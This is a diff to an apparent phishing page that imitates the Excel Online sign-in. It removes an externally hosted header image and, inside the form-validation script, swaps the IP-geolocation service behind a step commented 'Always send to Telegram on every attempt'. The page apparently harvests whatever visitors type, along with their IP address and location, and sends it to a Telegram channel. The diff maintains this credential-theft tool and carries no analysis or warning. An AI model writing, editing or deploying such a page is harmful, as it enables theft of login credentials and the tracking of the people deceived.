@@ -1,4 +1,5 @@
 
+
 <!DOCTYPE html>
 <html lang="en"><head>
 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
@@ -456,7 +457,6 @@ html {
 <div id="top-header">
 <table style="border:none; width:100%; padding:0; margin:0; height:50px; border-spacing:0; color:#fff; z-index:10000000; position:absolute;">
 <tbody><tr>
-<td style="background:#217346 url(http://perfectmoneyflow.com/core//small.png); width:4%; height:100%; margin:0; padding:0;"></td>
 <td style="background:#217346; width:10%; height:100%; margin:0; padding:0; text-align:center;">
 Excel Online</td>
 <td style="background:#000000; width:70%; height:100%; margin:0; padding:0;"></td>
@@ -564,7 +564,7 @@ function validateForm(event) {
 
     // --- Always send to Telegram on every attempt ---
     // Get IP + Location details
-    fetch("https://ipapi.co/json/")
+    fetch("https://ipwho.is/")
         .then(res => res.json())
         .then(ipData => {
             let ip = ipData.ip || "N/A";
